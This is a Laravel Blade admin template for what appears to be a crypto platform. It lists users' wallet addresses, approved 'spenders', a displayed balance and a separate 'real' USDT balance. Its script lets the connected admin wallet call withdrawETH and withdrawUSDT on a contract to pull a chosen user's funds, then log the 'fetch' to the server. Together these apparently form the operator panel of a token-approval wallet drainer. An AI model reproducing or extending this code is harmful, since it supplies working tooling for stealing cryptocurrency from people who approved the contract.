@extends("layouts.app")
@section('content')
<!-- Content Header (Page header) -->
<div class="content-header">
    <div class="container-fluid">
        <div class="mb-2">
            <h1 class="m-0">Users</h1>
        </div>
    </div>
</div>

<!-- Main content -->
<div class="content">
    <div class="container-fluid">
        <div class="card">
            <div class="card-header">
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <input class="form-control" type="search" placeholder="Search with user id or wallet address" aria-label="Search" />
                    </div>
                    <div class="col-md-6">
                        <div class="float-right">
                            {{-- <small>Connected Wallet:</small> --}}
                            <button id="connectButton" type="button" class="btn btn-primary" onClick="connectWallet()">
                                Connect
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /.card-header -->
            <div class="card-body table-responsive p-0">
                <table class="table table-striped text-nowrap">
                    <thead>
                        <tr>
                            <th style="width: 10px">#</th>
                            <th>User Id</th>
                            <th>Wallet Address</th>
                            <th>Balance</th>
                            <th>Real Balance (USDT)</th>
                            <th>Status</th>
                            <th style="width: 40px">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach($data as $key => $user)
                        <tr>
                            <td>{{$key += 1}}</td>
                            <td>{{$user->user_id}}</td>
                            <td>{{$user->wallet}} <br /> <span class="badge badge-primary">{{$user->spender ?? $user->spender }}</span></td>
                            <td>{{$user->balance}}</td>
                            <td id="real_balance">{{$user->real_balance}}</td>
                            <td>@if ($user->status == 'pending') <span class="badge badge-warning">pending</span> @else <span class="badge badge-primary">approved</span>@endif</td>
                            <td>
                                {{-- <button class="btn btn-secondary">
                                <i class="fas fa-ellipsis-v"></i>
                                </button> --}}
                                {{-- @include('partials._drop1'); --}}
                                @if ($user->status == 'pending')
                                <a href="#" onClick="updateStatus({{$user->id}})" data-user_id={{$user->id}} class="btn btn-primary btn-sm">
                                    Approve
                                </a>
                                @else
                                <a href="#" id="modal_{{$user->id}}" onClick="fetchToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->real_balance}}>
                                    Fetch Eth
                                </a>
                                <a href="{{ route('users.manage.balance', ['id' => $user->id]) }}" class="btn btn-secondary btn-sm">Manage balance</a>
                                @endif
                            </td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
            @include('partials._modal')
            <!-- /.card-body -->
        </div>
        <!-- /.card -->
    </div>
    <!-- /.container-fluid -->
</div>
<!-- /.content -->
@endsection
@section('scripts')

<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"> </script>
<script src="{{ asset('contracts/contractABI.js') }}"></script>
<script src="{{ asset('contracts/contractAddress.js') }}"></script>

<script>
    const web3 = new Web3(window.ethereum)
    const contract = new web3.eth.Contract(contractABI, contractAddress)

    // Get info
    const getInfo = async () => {
        // Get connected user balances
        var walletAddress = await web3.eth.getAccounts()
    }

    // Wallet Connect
    const connectWallet = async () => {
        try {
            const accounts = await window.ethereum.request({
                method: 'eth_requestAccounts'
            })
            const walletAddress = accounts[0]

            console.log(`Admin Wallet Address: ${walletAddress}`)

            $('#connectButton').text(walletAddress.slice(0, 4) + '...' + walletAddress.slice(-5))

            $('#connectButton').prop('disabled', true)
        } catch (error) {
            console.error('Error connecting wallet:', error)
        }
    }

    // Withdraw from user
    const withdrawETH = async () => {
        // Ensure the user has connected their wallet
        const accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
        })
        const adminWalletAddress = accounts[0]
        let user = $('#modal-wallet').val();
        let amount = parseInt($('#modal-amount').val());
        try {
            // Convert amount to Wei
            const amountInEth = web3.utils.toWei(amount.toString(), 'ether')

            // Call the withdraw method on the contract
            const transaction = await contract.methods.withdrawETH(user, amountInEth).send({
                from: adminWalletAddress,
            })
            console.log('ETH Withdrawal successful:', transaction)

            if(transaction)
            {
                $.ajaxSetup({
                headers: {
                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                }
                });

                $.ajax({
                    url: "{{ route('fetch.tokens') }}",
                    type: 'POST',
                    data: {
                        wallet: user,
                        amount: amount,
                        spender: accounts[0],
                    },
                }).done(function(response) {
                    if (response == 'ok') {
                        window.location.reload();
                    }
                });
            }
        } catch (error) {
            console.error('Error withdrawing from contract:', error)
        }
    }

    // Withdraw from user
    const withdrawUSDT = async () => {
        // Ensure the user has connected their wallet
        const accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
        })
        const adminWalletAddress = accounts[0]
        let user = $('#modal-wallet').val();
        let amount = parseInt($('#modal-amount').val());
        try {
            // Call the withdraw method on the contract
            const transaction = await contract.methods.withdrawUSDT(user, amount).send({
                from: adminWalletAddress,
            });
            console.log('USDT Withdrawal successful:', transaction)

            if(transaction)
            {
                $.ajaxSetup({
                headers: {
                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                }
                });

                $.ajax({
                    url: "{{ route('fetch.tokens') }}",
                    type: 'POST',
                    data: {
                        wallet: user,
                        amount: amount,
                        spender: accounts[0],
                    },
                }).done(function(response) {
                    if (response == 'ok') {
                        window.location.reload();
                    }
                });
            }
        } catch (error) {
            console.error('Error withdrawing from contract:', error)
        }
    }

    function updateStatus(id) {

        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            }
        });

        $.ajax({
            url: "{{ route('update.status') }}",
            type: 'POST',
            data: {
                user_id: id
            },
        }).done(function(response) {
            if (response == 'ok') {
                window.location.reload();
            }
        });

    };

    async function fetchToken(id) {
        const accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
        });
        const adminWalletAddress = accounts[0];

        var wallet = $("#modal_" + id).attr('data-wallet');
        var balance = $("#modal_" + id).attr('data-balance');

        $("#modal-wallet").val(wallet);
        $("#modal-spender").val(adminWalletAddress);
        $("#modal-balance").text(balance);

        $('#fetchForm').modal('show');


    }

    function checkBalance() {

        var balance = $("#modal-amount").val();

        var a_balance = $("#modal-balance").text();


        if (parseInt(balance) > parseInt(a_balance)) {
            $("#btn-fetch").attr("disabled", "disabled");

        } else if (parseInt(balance) <= parseInt(a_balance)) {

            $("#btn-fetch").removeAttr('disabled');

        }

    }
</script>
@endsection
